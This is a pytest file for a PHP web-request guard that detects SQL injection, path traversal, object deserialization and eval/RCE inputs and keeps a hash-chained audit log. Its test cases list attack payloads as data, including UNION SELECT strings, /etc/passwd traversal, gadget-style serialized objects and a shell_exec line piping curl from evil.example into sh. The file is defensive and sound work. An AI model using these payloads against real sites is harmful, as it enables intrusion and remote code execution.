"""php_defense_guard: each rule, benign input, hash-chained log, and parity with php_defense_guard.php."""
from __future__ import annotations

import json
import shutil
import subprocess
from pathlib import Path

import pytest

from agent_gateway.audit_chain import verify_chain_file
from agent_gateway.php_defense_guard import RULE_CODES, PhpDefenseGuard, inspect_params, match_value

PHP_FILE = Path(__file__).resolve().parents[1] / "agent_gateway" / "php_defense_guard.php"
PHP = shutil.which("php")

# (params, expected rule code or None). Shared by the Python and PHP checks.
CASES: list[tuple[dict, str | None]] = [
    # SQL injection: UNION
    ({"id": "1 UNION SELECT user, password FROM wp_users"}, "PHP_SQLI_UNION"),
    ({"q": "x' union all select null,version()-- -"}, "PHP_SQLI_UNION"),
    ({"q": "1/**/UNION/**/SELECT/**/1"}, "PHP_SQLI_UNION"),
    ({"q": "1%20UNION%20SELECT%201"}, "PHP_SQLI_UNION"),  # double-encoded: decoded once by PHP, again here
    # SQL injection: tautology
    ({"id": "1' OR '1'='1"}, "PHP_SQLI_TAUTOLOGY"),
    ({"user": "admin\" or \"a\"=\"a"}, "PHP_SQLI_TAUTOLOGY"),
    ({"id": "5 OR 1=1"}, "PHP_SQLI_TAUTOLOGY"),
    # Path traversal
    ({"file": "../../../../etc/passwd"}, "PHP_PATH_TRAVERSAL"),
    ({"template": "..\\..\\windows\\win.ini"}, "PHP_PATH_TRAVERSAL"),
    ({"page": "%2e%2e%2f%2e%2e%2fwp-config.php"}, "PHP_PATH_TRAVERSAL"),
    ({"opts": {"nested": ["ok", "../../.env"]}}, "PHP_PATH_TRAVERSAL"),
    # PHP object deserialization
    ({"session": 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}'}, "PHP_DESERIALIZE_DENIED"),
    ({"cart": 'a:1:{i:0;O:22:"GuzzleHttp\\Psr7\\FnStream":0:{}}'}, "PHP_DESERIALIZE_DENIED"),
    ({"c": 'C:11:"ArrayObject":21:{x:i:0;a:0:{};m:a:0:{}}'}, "PHP_DESERIALIZE_DENIED"),
    ({"remember": "O%3A8%3A%22stdClass%22%3A0%3A%7B%7D"}, "PHP_DESERIALIZE_DENIED"),
    # RCE / eval
    ({"cmd": "system('id')"}, "PHP_RCE_EVAL"),
    ({"code": "eval (base64_decode('cGhwaW5mbygpOw=='));"}, "PHP_RCE_EVAL"),
    ({"x": "SHELL_EXEC(\"curl evil.example | sh\")"}, "PHP_RCE_EVAL"),
    ({"cb": "assert($_GET['a'])"}, "PHP_RCE_EVAL"),
    ({"f": "proc_open('sh', [], $p)"}, "PHP_RCE_EVAL"),
    # Payload in a key, not a value
    ({"../../etc/passwd": "1"}, "PHP_PATH_TRAVERSAL"),
    # Benign input
    ({"q": "select a plan that fits", "name": "O'Brien"}, None),
    ({"title": "Executive summary (Q3)", "body": "We will evaluate options and union the lists."}, None),
    ({"path": "../images/logo.png", "slug": "hello-world"}, None),
    ({"rating": "4 or 5", "note": "Order 12 = paid"}, None),
    ({"email": "a.b@example.com", "tags": ["php", "wordpress"], "page": 3, "draft": False}, None),
    ({"json": '{"a":1,"b":"c"}', "serialized_array": 'a:1:{i:0;s:1:"x";}'}, None),
    ({"search": "how to use system() safely"}, "PHP_RCE_EVAL"),  # known false positive: documented
]


@pytest.mark.parametrize("params,expected", CASES)
def test_rules(params, expected):
    d = inspect_params(params)
    assert d.rule_code == (expected or "COMPLIANT"), (params, d)
    assert d.allowed is (expected is None)
    if expected:
        assert len(d.value_sha256) == 64 and d.field


def test_rule_codes_are_explicit():
    assert set(RULE_CODES) == {"PHP_SQLI_UNION", "PHP_SQLI_TAUTOLOGY", "PHP_PATH_TRAVERSAL",
                               "PHP_DESERIALIZE_DENIED", "PHP_RCE_EVAL"}
    assert match_value("plain text") is None


def test_field_names_follow_php_bracket_notation():
    d = inspect_params({"user": {"prefs": ["dark", "O:3:\"Foo\":0:{}"]}})
    assert d.field == "user[prefs][1]" and d.rule_code == "PHP_DESERIALIZE_DENIED"


def test_guard_logs_denials_in_a_verifiable_chain(tmp_path: Path):
    log = tmp_path / "php_audit.jsonl"
    guard = PhpDefenseGuard(log)
    requests = [
        {"get": {"id": "1 UNION SELECT 1"}, "uri": "/?id=1", "method": "GET", "client_ip": "203.0.113.5"},
        {"get": {"p": "about"}, "post": {}, "cookie": {"theme": "dark"}},
        {"post": {"file": "../../../etc/passwd"}, "uri": "/upload", "method": "POST"},
        {"cookie": {"session": 'O:8:"stdClass":0:{}'}},
        {"post": {"code": "eval($x)"}},
    ]
    results = [guard.inspect(r) for r in requests]
    assert [r.rule_code for r in results] == ["PHP_SQLI_UNION", "COMPLIANT", "PHP_PATH_TRAVERSAL",
                                              "PHP_DESERIALIZE_DENIED", "PHP_RCE_EVAL"]
    assert results[2].field == "file" and results[3].field == "session"

    report = verify_chain_file(log)
    assert report.ok and report.entries == 4  # allowed requests are not logged by default
    entries = [json.loads(ln) for ln in log.read_text().splitlines()]
    assert entries[0]["uri"] == "/?id=1" and entries[0]["client_ip"] == "203.0.113.5"
    for prev, cur in zip(entries, entries[1:]):
        assert cur["prev_hash"] == prev["entry_hash"]
    text = log.read_text()
    assert "etc/passwd" not in text and "UNION SELECT" not in text and "stdClass" not in text  # values hashed

    lines = log.read_text().splitlines()
    lines[1] = lines[1].replace("PHP_PATH_TRAVERSAL", "COMPLIANT")
    log.write_text("\n".join(lines) + "\n")
    assert verify_chain_file(log).ok is False


def test_log_allowed_option(tmp_path: Path):
    guard = PhpDefenseGuard(tmp_path / "a.jsonl", log_allowed=True)
    guard.inspect({"q": "hello"})
    assert verify_chain_file(tmp_path / "a.jsonl").entries == 1


# --- parity with the PHP class ---------------------------------------------------

needs_php = pytest.mark.skipif(PHP is None, reason="php binary not installed")


def _php(script: str, stdin: str = "", env_extra: dict | None = None) -> subprocess.CompletedProcess:
    return subprocess.run([PHP, "-d", "display_errors=stderr", "-r", script], input=stdin,
                          capture_output=True, text=True, timeout=60)


@needs_php
def test_php_file_parses():
    res = subprocess.run([PHP, "-l", str(PHP_FILE)], capture_output=True, text=True, timeout=60)
    assert res.returncode == 0, res.stdout + res.stderr


@needs_php
def test_php_and_python_agree_on_every_case(tmp_path: Path):
    log = tmp_path / "php_written.jsonl"
    script = f"""
        require {json.dumps(str(PHP_FILE))};
        $g = new \\AgentGate\\PhpDefenseGuard({json.dumps(str(log))});
        $out = [];
        foreach (json_decode(stream_get_contents(STDIN), true) as $params) {{
            $hit = \\AgentGate\\PhpDefenseGuard::inspect($params);
            if ($hit !== null) {{ $g->logViolation($hit); }}
            $out[] = $hit;
        }}
        echo json_encode($out);
    """
    res = _php(script, json.dumps([p for p, _ in CASES]))
    assert res.returncode == 0, res.stderr
    php_hits = json.loads(res.stdout)
    for (params, expected), hit in zip(CASES, php_hits):
        py = inspect_params(params)
        assert (hit["rule_code"] if hit else None) == expected, (params, hit)
        if hit:
            assert hit["field"] == py.field and hit["value_sha256"] == py.value_sha256, params
    # The PHP-written log is a valid audit_chain log.
    report = verify_chain_file(log)
    assert report.ok, report.errors
    assert report.entries == sum(1 for _, e in CASES if e)


@needs_php
def test_php_enforce_answers_403_with_rule_code(tmp_path: Path):
    log = tmp_path / "enforce.jsonl"
    script = f"""
        require {json.dumps(str(PHP_FILE))};
        $_GET = ['p' => 'home'];
        $_POST = ['comment' => 'nice post'];
        $_COOKIE = ['wp_session' => 'O:8:"stdClass":0:{{}}'];
        $_SERVER['REQUEST_URI'] = '/wp-admin/admin-ajax.php';
        $_SERVER['REQUEST_METHOD'] = 'POST';
        (new \\AgentGate\\PhpDefenseGuard({json.dumps(str(log))}))->inspectAndEnforce();
        echo "reached";
    """
    res = _php(script)
    assert res.returncode == 1 and "reached" not in res.stdout
    body = json.loads(res.stdout)
    assert body == {"error": "AgentGate PHP Defense Blocked Request", "rule_code": "PHP_DESERIALIZE_DENIED",
                    "status": 403}
    entry = json.loads(log.read_text())
    assert entry["uri"] == "/wp-admin/admin-ajax.php" and entry["field"] == "wp_session"
    assert verify_chain_file(log).ok

    clean = _php(f"""
        require {json.dumps(str(PHP_FILE))};
        $_GET = ['s' => 'hello world']; $_POST = []; $_COOKIE = [];
        (new \\AgentGate\\PhpDefenseGuard({json.dumps(str(tmp_path / "clean.jsonl"))}))->inspectAndEnforce();
        echo "reached";
    """)
    assert clean.returncode == 0 and clean.stdout == "reached"
